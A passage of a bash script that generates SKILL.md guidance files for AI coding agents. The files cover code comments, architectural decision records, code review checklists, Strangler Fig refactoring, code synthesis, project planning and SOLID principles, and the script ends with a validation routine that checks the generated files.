category: "documentation"
subcategory: "code-comments"
language: "agnostic"
framework: "none"
technology: "code-documentation"
difficulty: "intermediate"
tags: ["documentation", "code-comments", "clean-code", "invariants", "intent", "maintainability"]
---

# Intent-Clarifying Code Comments and Invariant Documentation

## Purpose
Provide AI agents with concrete principles for writing high-value code comments that document the 'Why' and 'Invariants' rather than redundantly narrating the 'What'.

## When to Use
Use when writing complex algorithms, implementing mathematical formulas, working around upstream library bugs, or establishing critical safety invariants.

## Inputs / Context
Source code function or class, business invariant rules, edge case context, and historical bug workarounds.

## Instructions
1. Document the 'WHY', Never the 'WHAT':
   - Redundant Comment (Antipattern): `// Increment count by 1` followed by `count++;` (Adds zero value; wastes reading time).
   - Intent Comment (High Value): `// We increment count before socket dispatch to prevent race conditions where immediate ACK callbacks read stale sequence counters.`
2. Document Domain Invariants and Pre/Post-Conditions:
   - Invariants: Rules that must NEVER be violated (e.g., `// Invariant: Account balance must never drop below 0 after debit evaluation`).
   - Pre-conditions: Expected caller state (`// Precondition: items array must be pre-sorted in ascending order by timestamp`).
   - Post-conditions: Guaranteed state upon function exit.
3. Document Non-Obvious Workarounds and External Bug Links:
   - When code looks awkward or counter-intuitive due to a browser quirk or third-party library defect, explicitly cite the issue:
     `// Workaround for Safari 16.4 IndexedDB transaction auto-commit bug: see WebKit bug #254190`
4. Document Big-O Time and Space Complexity on Core Algorithms:
   - Include complexity annotations in function docstrings:
     `// Time Complexity: O(N log K) using min-heap. Space Complexity: O(K).`
5. Keep Comments Synchronized:
   - Outdated comments that contradict the code are more hazardous than no comments at all. Update or delete comments whenever the underlying logic changes.

## Constraints / Rules
- Never write comments that merely rephrase code syntax in plain English.
- Never leave commented-out dead code blocks in production repositories; Git tracks history.
- Avoid using comments as a substitute for clean code; refactor obscure variable names first.

## Workflow
1. Refactor code for maximum self-documenting clarity (expressive variable and function names).
2. Identify non-obvious business rules or performance trade-offs.
3. Formulate concise comments explaining the architectural intent.
4. Document invariants and algorithmic Big-O complexity in docstrings.
5. Review to ensure zero redundant narration comments remain.

## Expected Output
Clean source code accompanied strictly by high-value intent comments, invariant assertions, and complexity docstrings.

## Validation Checklist
- [ ] Do comments explain 'Why' rather than 'What'?
- [ ] Are critical domain invariants explicitly documented?
- [ ] Are weird workarounds linked to bug tracker URLs?
- [ ] Is Big-O complexity noted on algorithmic functions?
- [ ] Is commented-out dead code completely eliminated?

## Common Mistakes & Antipatterns
- Writing `/* Loop through users */` above `for (const user of users)`, adding visual clutter with zero information gain.
- Leaving a 40-line commented-out block of old code 'just in case we need it later', polluting the file.
- Changing a function to return cents instead of dollars, but leaving an old comment that says `// Returns amount in dollars`.

## Concrete Real-World Example
Scenario: A payment reconciliation loop has an unusual `sleep(250)` between batches that confuses new developers who try to delete it to 'optimize' speed.
Prompt: Write high-value intent comments explaining this payment batch throttling logic.
Application: The AI documents the operational invariant: `// Rate-limit throttle: Stripe restricts bulk transfers to 20 ops/sec per account. This 250ms sleep caps batch rate at 4 batches/sec (16 ops/sec), preventing HTTP 429 backoff storms that degrade webhook processing.`
EOF

cat << 'EOF' > skills/documentation/technical-writing/architectural-decision-records/SKILL.md
---
name: "architectural-decision-records"
description: "Authoring structured Architectural Decision Records (ADRs) utilizing the Michael Nygard template to document technical context, trade-offs, and consequences."
category: "documentation"
subcategory: "technical-writing"
language: "markdown"
framework: "none"
technology: "technical-documentation"
difficulty: "intermediate"
tags: ["documentation", "adr", "architecture", "technical-writing", "system-design", "trade-offs"]
---

# Architectural Decision Records (ADR) and Technical Design Documents

## Purpose
Instruct AI agents to author formal Architectural Decision Records (ADRs) that document significant technical choices, alternatives evaluated, trade-offs accepted, and downstream consequences.

## When to Use
Use when making major architectural changes: selecting a database, adopting a new framework, splitting a monolith, or changing authentication providers.

## Inputs / Context
Technical decision context, candidate options evaluated, decision driver constraints, and positive/negative consequences.

## Instructions
1. Standardize on the Canonical ADR Structure (Nygard / MADR Template):
   - Title: `ADR-NNNN: Short, imperative sentence describing the decision` (e.g., `ADR-0004: Adopt PostgreSQL Row-Level Security for Multi-Tenancy`).
   - Status: `Proposed`, `Accepted`, `Superseded` (by ADR-XXXX), or `Deprecated`.
   - Context: What is the technical, operational, or business problem we are facing? What forces and constraints are at play?
   - Decision Drivers: Key requirements influencing the choice (e.g., latency SLA, team familiarity, licensing cost).
   - Considered Options: List the 2-4 viable alternative architectures evaluated, including pros and cons for each.
   - Decision Outcome: The chosen option and the explicit rationale for why it was selected over alternatives.
   - Consequences:
     * Positive Consequences: Gains, performance improvements, simplified operations.
     * Negative Consequences / Trade-offs: Accepted technical debt, increased complexity, migration costs.
2. Maintain Objectivity and Rigor:
   - Document real trade-offs: every architectural decision has negative consequences; an ADR claiming zero downsides indicates inadequate technical analysis.
3. Number Sequentially and Commit to Git:
   - Store ADRs as markdown files in `docs/adr/0001-title.md` under version control alongside application source code.

## Constraints / Rules
- Never write an ADR that presents only a single option without documenting considered alternatives.
- Never omit the Negative Consequences section; every technical choice has trade-offs.
- Avoid treating ADRs as mutable documents; once Accepted, supersede them with a new ADR rather than rewriting history.

## Workflow
1. Identify significant architectural fork in the road.
2. Research 3 viable technological or architectural options.
3. Document context, drivers, and comparative pros/cons.
4. Record chosen outcome with explicit justification.
5. Catalog positive and negative downstream consequences.
6. Commit to `docs/adr/` and review with engineering team.

## Expected Output
Structured Architectural Decision Record (ADR) in markdown featuring complete context, alternatives matrix, decision rationale, and trade-off analysis.

## Validation Checklist
- [ ] Does the ADR follow standard structure (Title, Status, Context, Decision, Consequences)?
- [ ] Are multiple viable alternative options evaluated with pros and cons?
- [ ] Are negative trade-offs and consequences explicitly documented?
- [ ] Is the ADR saved as an immutable sequential markdown file in `docs/adr/`?
- [ ] Is the rationale grounded in empirical technical requirements?

## Common Mistakes & Antipatterns
- Writing an ADR after the code has already been deployed merely as a formality, omitting the real alternatives considered.
- Listing fake 'strawman' alternatives that nobody would ever consider just to make the chosen option look better.
- Failing to document the negative operational costs (e.g., training needs, monitoring complexity) of adopting a new technology.

## Concrete Real-World Example
Scenario: An engineering team decides to replace their MongoDB document database with PostgreSQL to support transactional ledger consistency.
Prompt: Author an Architectural Decision Record (ADR) documenting this database migration decision.
Application: The AI crafts `docs/adr/0003-migrate-from-mongodb-to-postgresql.md`, analyzes forces (financial ledger auditability, ACID requirements), compares MongoDB vs PostgreSQL vs CockroachDB, accepts PostgreSQL due to native JSONB and transactional guarantees, and documents negative consequences (data migration downtime and team SQL training requirements).
EOF

cat << 'EOF' > skills/general/code-review/checklist-driven-code-review/SKILL.md
---
name: "checklist-driven-code-review"
description: "Conducting rigorous, structured code reviews utilizing defensive engineering checklists, security verification, performance checks, and constructive feedback standards."
category: "general"
subcategory: "code-review"
language: "agnostic"
framework: "none"
technology: "engineering-practices"
difficulty: "intermediate"
tags: ["general", "code-review", "quality", "defensive-programming", "best-practices"]
---

# Checklist-Driven Code Review and Defensive Verification

## Purpose
Equip AI agents with a comprehensive, checklist-driven code review framework to audit pull requests for correctness, security vulnerabilities, edge-case coverage, and architectural health.

## When to Use
Use when reviewing pull requests, evaluating AI-generated code, conducting pre-merge audits, or mentoring developers.

## Inputs / Context
Git diff or pull request code, PR description, target architecture standards, and test results.

## Instructions
1. The 5-Pillar Code Review Checklist:
   - Pillar 1: Correctness & Logic
     * Does the code solve the intended problem?
     * Are edge cases (null, empty, negative, boundary conditions) handled?
     * Are asynchronous race conditions or concurrency deadlocks possible?
   - Pillar 2: Security & Defense
     * Is all external input strictly validated and sanitized?
     * Are database queries parameterized (SQL injection safe)?
     * Are authorization checks enforced at the resource level (IDOR safe)?
     * Are secrets or sensitive PII leaked in logs or error messages?
   - Pillar 3: Performance & Scalability
     * Are there N+1 query patterns or unbounded database loops?
     * Are memory-intensive operations streamed rather than buffered?
     * Are expensive calculations memoized or indexed?
   - Pillar 4: Maintainability & Design
     * Does the code adhere to existing project architectural patterns?
     * Are functions small and focused on a single responsibility?
     * Are variable and function names self-describing?
   - Pillar 5: Test Coverage & Verification
     * Are unit and integration tests included for both happy and failure paths?
     * Do tests verify behavior rather than implementation details?
2. Constructive Feedback Framing:
   - Differentiate Blocking issues from Non-blocking suggestions using tags: `[Blocking]`, `[Suggestion]`, `[Question]`, `[Nit]`.
   - Always explain the concrete technical risk behind a requested change.

## Constraints / Rules
- Never approve code with unparameterized database queries or unauthenticated mutation routes.
- Avoid bike-shedding on personal stylistic preferences that can be enforced automatically via Prettier or ESLint.
- Do not approve PRs that disable existing tests without written justification.

## Workflow
1. Read PR description and understand business intent.
2. Systematically evaluate diff across all 5 pillars.
3. Test edge cases mentally or via automated test suites.
4. Formulate actionable review comments with clear rationale.
5. Provide a summary verdict (Approve, Request Changes, Comment).

## Expected Output
Structured code review feedback report categorized by severity (Blocking vs Suggestion) across correctness, security, performance, and testability.

## Validation Checklist
- [ ] Are security vulnerabilities (SQLi, IDOR, XSS) checked?
- [ ] Are boundary conditions and error states verified?
- [ ] Are N+1 queries and performance bottlenecks flagged?
- [ ] Are feedback items categorized as [Blocking] or [Suggestion]?
- [ ] Is feedback constructive with clear rationale?

## Common Mistakes & Antipatterns
- Spending 80% of review time commenting on missing spaces or variable casing (which linters should catch) while missing an unauthenticated database deletion endpoint.
- Writing vague review comments like 'This looks wrong' without explaining why or suggesting a correct alternative.
- Approving a 1,000-line PR after glancing at it for 30 seconds (Rubber-stamping).

## Concrete Real-World Example
Scenario: A pull request adds a new user search endpoint by concatenating the search query directly into a SQL statement and omitting pagination limits.
Prompt: Conduct a rigorous code review on this pull request diff.
Application: The AI performs a 5-pillar review, raises a `[Blocking]` security alert for SQL injection with a parameterized query example, raises a `[Blocking]` performance issue for missing `LIMIT` pagination, offers a `[Suggestion]` for debouncing input, and outlines required unit test cases.
EOF

cat << 'EOF' > skills/general/refactoring/strangler-fig-and-safe-refactoring/SKILL.md
---
name: "strangler-fig-and-safe-refactoring"
description: "Incrementally modernizing monolithic and legacy codebases using Martin Fowler's Strangler Fig pattern, characterization testing, and branch-by-abstraction."
category: "general"
subcategory: "refactoring"
language: "agnostic"
framework: "none"
technology: "refactoring"
difficulty: "advanced"
tags: ["general", "refactoring", "strangler-fig", "legacy-code", "branch-by-abstraction", "characterization-tests"]
---

# Safe Incremental Refactoring and the Strangler Fig Pattern

## Purpose
Instruct AI agents to execute safe, incremental refactorings of legacy systems without risky 'big bang' rewrites, utilizing Strangler Fig routing and characterization tests.

## When to Use
Use when replacing legacy frameworks, decomposing monolithic codebases, rewriting core services, or replacing deprecated database layers.

## Inputs / Context
Legacy module code, replacement architecture specifications, test suites, and routing proxy capabilities.

## Instructions
1. Avoid 'Big Bang' Rewrites:
   - Complete system rewrites from scratch fail over 80% of the time due to scope creep, forgotten edge cases, and shifting business requirements.
   - Always refactor incrementally in production using the Strangler Fig pattern.
2. The Strangler Fig Pattern Execution:
   - Place an Intercepting Proxy (API Gateway, Nginx, or middleware) in front of the legacy system.
   - Implement the new replacement service alongside the old system.
   - Route traffic for a single, small feature/endpoint to the new service while routing all other traffic to the legacy system.
   - Progressively migrate endpoints one by one until the legacy system is completely 'strangled' (handles 0% traffic) and can be safely decommissioned.
3. Characterization Testing (Golden Master / Approval Tests):
   - Before modifying legacy code that lacks unit tests, write Characterization Tests: capture the actual inputs and outputs of the legacy system across thousands of real transactions.
   - Use these captured outputs as a regression test baseline to ensure the new refactored implementation behaves identically in all edge cases.
4. Branch by Abstraction for In-Process Refactoring:
   - When refactoring internal code without an API proxy:
     * Create an abstraction layer (Interface) over the component to be replaced.
     * Refactor existing callers to consume the abstraction.
     * Implement the new modern component satisfying the abstraction.
     * Switch implementations via feature flag or dependency injection.
     * Remove the legacy implementation.

## Constraints / Rules
- Never attempt a wholesale 'big bang' replacement of a mission-critical production service.
- Never refactor legacy code without establishing characterization tests first.
- Do not leave dead legacy code paths active after new implementations have stabilized.

## Workflow
1. Establish characterization tests verifying legacy system outputs.
2. Introduce abstraction boundary or API routing proxy.
3. Implement new service/component behind feature flag.
4. Route 5% of traffic to new implementation and monitor error rates.
5. Ramp traffic to 100% and decommission the legacy code path.

## Expected Output
Step-by-step Strangler Fig migration plan and code implementing branch-by-abstraction interfaces, feature toggles, and characterization test harnesses.

## Validation Checklist
- [ ] Are characterization tests established before altering legacy code?
- [ ] Is migration partitioned into small, independently deployable increments?
- [ ] Is traffic routed dynamically via proxy or feature flags?
- [ ] Can traffic be rolled back to the legacy implementation instantly if errors occur?
- [ ] Is dead legacy code permanently deleted upon successful cutover?

## Common Mistakes & Antipatterns
- Convincing leadership to halt all feature work for 6 months for a 'total rewrite', which ends in failure and abandoned code.
- Refactoring internal business algorithms based on assumptions without testing against real production input/output snapshots.
- Leaving the legacy and new systems running in parallel forever because nobody bothered to complete the final cleanup phase.

## Concrete Real-World Example
Scenario: A legacy monolithic PHP billing system needs to be migrated to a modern Node.js microservice without interrupting active billing operations.
Prompt: Design a safe incremental migration plan using the Strangler Fig pattern.
Application: The AI places an API gateway in front of the monolith, authors characterization tests capturing invoice calculations, implements invoice PDF generation first in Node.js and routes that route via gateway, verifies stability, and progressively migrates payment webhooks, retiring the PHP service with zero downtime.
EOF

cat << 'EOF' > skills/general/code-generation/context-rich-code-synthesis/SKILL.md
---
name: "context-rich-code-synthesis"
description: "Synthesizing complete, production-ready code by extracting surrounding project context, matching existing idioms, respecting constraints, and eliminating placeholders."
category: "general"
subcategory: "code-generation"
language: "agnostic"
framework: "none"
technology: "code-generation"
difficulty: "intermediate"
tags: ["general", "code-generation", "synthesis", "production-quality", "context-grounding", "no-placeholders"]
---

# Context-Rich Code Synthesis and Constraint Grounding

## Purpose
Instruct AI agents to generate production-quality code that seamlessly matches the surrounding project's style, imports existing dependencies, handles all edge cases, and completely eliminates placeholder comments.

## When to Use
Use whenever an AI assistant writes, modifies, or extends software code in any programming language.

## Inputs / Context
User task prompt, target repository files, surrounding code idioms, existing dependencies, and design patterns.

## Instructions
1. Inspect Surrounding Context Before Generating:
   - Examine existing imports, project structure, naming conventions (camelCase vs snake_case), and library choices.
   - Reuse existing utility functions and installed packages rather than inventing new helper libraries or installing duplicate packages.
2. Complete, Production-Ready Code (Zero Placeholders):
   - NEVER use lazy placeholder comments such as:
     * `// Stub: Implement later`
     * `// Add error handling here`
     * `/* ... rest of code ... */`
     * `pass  # deferred logic`
   - Every function, error handler, validation check, and data model must be fully implemented and syntactically complete.
3. Defensive Programming by Default:
   - Handle null, undefined, empty collections, and error boundaries in every generated code block.
   - Use strict types, explicit error returns, and validated schemas.
4. Idiomatic Language Fluency:
   - Respect the target language's actual runtime and idioms: do not write Python like Java, do not write Go like JavaScript.
   - Use language-native constructs (comprehensions in Python, goroutines in Go, pattern matching in Rust, runes in Svelte 5).
5. Self-Contained and Runnable:
   - Ensure all necessary imports are included at the top of the file.
   - Ensure the generated code compiles cleanly without syntax errors.

## Constraints / Rules
- Never emit incomplete code snippets with 'left as an exercise' or 'TODO' placeholders.
- Never invent imaginary APIs, package names, or non-existent framework methods.
- Avoid introducing unnecessary third-party dependencies when standard library primitives suffice.

## Workflow
1. Analyze the surrounding codebase style, conventions, and existing dependencies.
2. Draft complete implementation covering all edge cases and error handling.
3. Review code internally to ensure zero placeholder comments remain.
4. Verify all import statements match real, installed packages.
5. Output clean, fully implemented, ready-to-run source code.

## Expected Output
Complete, production-ready source code file with zero placeholders, full error handling, idiomatic style, and verified imports.

## Validation Checklist
- [ ] Are all functions fully implemented with zero `stub` placeholders?
- [ ] Are all necessary imports included?
- [ ] Does naming and architecture match the surrounding repository?
- [ ] Are errors and edge cases explicitly handled?
- [ ] Is the code syntactically valid and ready to run?

## Common Mistakes & Antipatterns
- Outputting a function body that says `// insert database query here`, forcing the developer to write the hardest part themselves.
- Hallucinating a fictitious convenience method like `jwt.verifyAndDecodeAsync()` that does not exist in the installed library.
- Writing Java-style class hierarchies in a lightweight Python script.

## Concrete Real-World Example
Scenario: A developer asks for a complete authentication middleware for an Express TypeScript application.
Prompt: Write a production-ready JWT authentication middleware in TypeScript.
Application: The AI writes a complete, compilable middleware file importing `jsonwebtoken`, extracting Bearer tokens, handling expired/malformed errors with standard 401 Problem Details responses, extending Express `Request` interface with typed user claims, with zero placeholder comments.
EOF

cat << 'EOF' > skills/general/project-planning/wbs-and-milestone-decomposition/SKILL.md
---
name: "wbs-and-milestone-decomposition"
description: "Decomposing complex engineering initiatives into actionable Work Breakdown Structures (WBS), milestone gates, critical path sequencing, and risk registers."
category: "general"
subcategory: "project-planning"
language: "markdown"
framework: "none"
technology: "project-management"
difficulty: "intermediate"
tags: ["general", "project-planning", "wbs", "milestones", "critical-path", "risk-management"]
---

# Work Breakdown Structure (WBS) and Technical Project Planning

## Purpose
Provide AI agents with structured project management methodologies to break sprawling multi-month engineering projects into granular, measurable milestones with explicit critical path sequencing.

## When to Use
Use when planning engineering roadmaps, scoping major software rewrites, drafting project proposals, or estimating engineering timelines.

## Inputs / Context
Project scope, technical dependencies, team capacity, target delivery date, and technical unknowns.

## Instructions
1. Work Breakdown Structure (WBS) Decomposition:
   - Decompose the project hierarchically: Phase -> Epic -> Milestone -> Story/Task.
   - Enforce the 100% Rule: The WBS must encompass 100% of the work defined by the project scope and capture all deliverables (including testing, documentation, and infrastructure).
   - Granularity Rule: Atomic tasks should represent 1 to 3 days of engineering effort. Tasks larger than 5 days must be decomposed further.
2. Identify the Critical Path:
   - Map dependencies between tasks: determine which sequence of dependent tasks directly determines the minimum total project duration.
   - Highlight dependencies where delays immediately push back the overall release date.
3. Design Verifiable Milestone Gates:
   - Every milestone must have an unambiguous, binary Definition of Done (DoD) that can be verified through demonstration or automated test pass.
   - Avoid subjective milestones like 'Frontend 80% complete'; use verifiable milestones like 'User can register, verify email, and log in to dashboard in staging'.
4. Build a Technical Risk Register:
   - Catalog project risks across: Probability (1-5), Impact (1-5), Severity (P * I).
   - For every high-severity risk, define an upfront Mitigation Strategy (e.g., building a 2-day proof-of-concept spike to validate third-party API performance before committing to architecture).

## Constraints / Rules
- Never create project plans with multi-week tasks that have no intermediate verifiable deliverables.
- Never assume an optimistic schedule without budgeting for integration testing, bugs, and deployment.
- Avoid treating project plans as static documents; include review checkpoints.

## Workflow
1. Define overall project scope and Definition of Done.
2. Decompose into hierarchical WBS task tree.
3. Identify task dependencies and calculate the critical path.
4. Establish phased milestones with verification criteria.
5. Construct risk register with mitigation spikes.

## Expected Output
Comprehensive Technical Project Plan featuring a hierarchical WBS task table, critical path diagram, milestone criteria, and risk mitigation register.

## Validation Checklist
- [ ] Does the WBS account for 100% of scope (including QA, ops, docs)?
- [ ] Are individual tasks scoped to <= 3 days of work?
- [ ] Is the critical path identified and highlighted?
- [ ] Are milestone gates defined by verifiable demonstration criteria?
- [ ] Does the risk register include actionable mitigation spikes?

## Common Mistakes & Antipatterns
- Planning software projects with a single task called 'Build Backend (4 weeks)', discovering at week 5 that nothing integrates.
- Omitting DevOps, CI/CD pipeline setup, and staging deployments from the project plan, delaying launch by weeks.
- Ignoring third-party dependency risks until the final week of the project.

## Concrete Real-World Example
Scenario: A startup plans to migrate their core web application from a legacy monolith to Next.js and needs an engineering project plan to present to leadership.
Prompt: Build a Work Breakdown Structure and milestone roadmap for this Next.js migration.
Application: The AI creates a 4-phase WBS (Foundation & Spikes, Core Auth & Layout, Feature Migration, Cutover & Sunset), identifies the critical path through auth session sharing, defines verifiable milestone gates, and schedules an upfront 2-day spike to mitigate cookie domain security risks.
EOF

cat << 'EOF' > skills/general/best-practices/solid-and-dry-pragmatism/SKILL.md
---
name: "solid-and-dry-pragmatism"
description: "Applying SOLID principles, DRY, and KISS pragmatically in real-world software engineering, avoiding dogmatism, premature abstraction, and over-engineering."
category: "general"
subcategory: "best-practices"
language: "agnostic"
framework: "none"
technology: "software-engineering"
difficulty: "intermediate"
tags: ["general", "best-practices", "solid", "dry", "kiss", "pragmatism", "clean-code"]
---

# Pragmatic SOLID, DRY, and KISS Software Engineering Principles

## Purpose
Instruct AI agents to apply core software engineering design principles (SOLID, DRY, KISS, YAGNI) pragmatically, balancing clean architecture against over-engineering and premature abstraction.

## When to Use
Use during code design, architecture reviews, refactoring discussions, or whenever evaluating design trade-offs.

## Inputs / Context
Feature requirements, software abstractions, existing code patterns, and future change vectors.

## Instructions
1. Pragmatic SOLID Application:
   - Single Responsibility Principle (SRP): A class or module should have one, and only one, reason to change. Separate business calculations from I/O and persistence.
   - Open/Closed Principle (OCP): Software entities should be open for extension, but closed for modification. Use interfaces and strategy patterns for pluggable behaviors.
   - Liskov Substitution Principle (LSP): Subtypes must be substitutable for their base types without altering program correctness.
   - Interface Segregation Principle (ISP): Many client-specific interfaces are better than one general-purpose interface. Do not force clients to depend on methods they do not use.
   - Dependency Inversion Principle (DIP): Depend upon abstractions, not concretions.
2. The Rule of Three vs. Premature DRY:
   - 'Duplication is far cheaper than the wrong abstraction' (Sandi Metz).
   - Do NOT create complex generic abstractions when code is duplicated only once.
   - Wait until the exact same pattern appears for the third time (Rule of Three) before extracting a shared abstraction.
   - Distinguish between Accidental Duplication (two pieces of code look identical today by coincidence, but will evolve for different business reasons) and Essential Duplication.
3. KISS and YAGNI (You Aren't Gonna Need It):
   - Choose the simplest solution that completely solves the current problem.
   - Never write code for hypothetical future requirements that do not exist today.
   - Every unnecessary abstraction introduces cognitive overhead, debugging complexity, and maintenance debt.

## Constraints / Rules
- Never introduce 5 layers of design pattern indirection (factories of factories) for a trivial single-purpose function.
- Do not DRY up code that changes for fundamentally different business reasons.
- Avoid dogmatic adherence to principles when the practical engineering outcome creates unnecessary complexity.

## Workflow
1. Analyze the core problem and write the direct, readable implementation (KISS).
2. Separate distinct business responsibilities (SRP).
3. If code is duplicated in 3+ places for the same reason, extract a shared helper (DRY).
4. Invert dependencies where testability or swappability is required (DIP).
5. Review to ensure no speculative features or unused abstractions were added (YAGNI).

## Expected Output
Clean, pragmatic software architecture that balances clean object-oriented/functional principles with simplicity, maintainability, and zero over-engineering.

## Validation Checklist
- [ ] Does each module have a single clear reason to change?
- [ ] Are abstractions justified by actual reuse (Rule of Three) rather than speculation?
- [ ] Is hypothetical future-proofing avoided (YAGNI)?
- [ ] Are interfaces focused and client-specific (ISP)?
- [ ] Is the resulting code easy for another developer to read and understand (KISS)?

## Common Mistakes & Antipatterns
- Creating an `AbstractWidgetFactoryProviderStrategy` with 8 interfaces to format a phone number, turning a 5-line task into an unmaintainable 400-line labyrinth.
- Combining a user notification email and an internal billing alert into a single 'DRY' template, making it impossible to change user marketing copy without breaking internal alerts.
- Writing complex multi-tenant database partitioning code for an application that has 20 total users.

## Concrete Real-World Example
Scenario: A developer creates an overly dogmatic architecture with 12 nested classes, abstract factories, and custom dependency containers to parse a simple CSV file.
Prompt: Refactor this over-engineered CSV parser using pragmatic KISS and SOLID principles.
Application: The AI strips away the redundant factory layers, creates a single pure `parseCsv(stream, schema)` function adhering to SRP, extracts a clean `RecordValidator` interface, and removes 600 lines of premature boilerplate while improving testability and clarity.
EOF

# ==============================================================================
# 4. Built-in Validation and Quality Verification Suite
# ==============================================================================
echo "==> Running Phase 1 validation checks..."

FAILED_CHECKS=0

# Check root files
for f in README.md LICENSE CONTRIBUTING.md CODE_OF_CONDUCT.md SECURITY.md ROADMAP.md CHANGELOG.md; do
    if [[ ! -s "$f" ]]; then
        echo "❌ Error: Root file $f is missing or empty!"
        FAILED_CHECKS=$((FAILED_CHECKS + 1))
    fi
done

# Check docs
for f in docs/getting-started.md docs/skill-format.md docs/naming-conventions.md docs/contribution-guide.md; do
    if [[ ! -s "$f" ]]; then
        echo "❌ Error: Documentation file $f is missing or empty!"
        FAILED_CHECKS=$((FAILED_CHECKS + 1))
    fi
done

# Check template
if [[ ! -s "templates/SKILL.md" ]]; then
    echo "❌ Error: templates/SKILL.md is missing or empty!"
    FAILED_CHECKS=$((FAILED_CHECKS + 1))
fi

# Count generated skills and verify non-empty
SKILL_COUNT=$(find skills -type f -name "SKILL.md" | wc -l)
if [[ "$SKILL_COUNT" -lt 122 ]]; then
    echo "❌ Error: Expected at least 122 skills, but found: $SKILL_COUNT"
    FAILED_CHECKS=$((FAILED_CHECKS + 1))
fi

# Verify skills start with YAML frontmatter
EMPTY_OR_INVALID=0
while IFS= read -r -d '' skill_file; do
    if ! head -n 1 "$skill_file" | grep -q "^---"; then
        echo "❌ Error: Invalid YAML frontmatter in $skill_file"
        EMPTY_OR_INVALID=$((EMPTY_OR_INVALID + 1))
    fi
done < <(find skills -type f -name "SKILL.md" -print0)
if [[ "$EMPTY_OR_INVALID" -gt 0 ]]; then
    FAILED_CHECKS=$((FAILED_CHECKS + EMPTY_OR_INVALID))
fi

# Check for accidental placeholder tokens in skills
PLACEHOLDERS=$(grep -rnE "(//[[:space:]]+TODO|#[[:space:]]+TODO|FIXME:)" skills/ 2>/dev/null || true)
if [[ -n "$PLACEHOLDERS" ]]; then
    echo "❌ Warning: Unimplemented placeholders found in skills:"
    echo "$PLACEHOLDERS"
    FAILED_CHECKS=$((FAILED_CHECKS + 1))
fi

if [[ "$FAILED_CHECKS" -gt 0 ]]; then
    echo "❌ Phase 1 generation completed with $FAILED_CHECKS validation errors."
    exit 1
fi

DOCS_COUNT=$(find docs -type f -name "*.md" | wc -l)
TOTAL_FILES=$(find . -type f ! -path "./.git/*" | wc -l)

echo ""
echo "=================================================="
echo "✅ Phase 1 content generated successfully"
echo "✅ Documentation generated"
echo "✅ Skill template generated"
echo "✅ Skills generated"
echo "✅ Validation completed"
echo "=================================================="
echo "📊 Summary Counts:"
echo "   - Skill files (SKILL.md):  ${SKILL_COUNT}"
echo "   - Documentation files:    ${DOCS_COUNT} docs + 7 root files"
echo "   - Total generated files:  ${TOTAL_FILES}"
echo "   - Top-level categories:   24 canonical domains"
echo "=================================================="
echo "FREE-AI-SKILLS-FOR-DEVELOPERS Phase 1 is ready to use!"
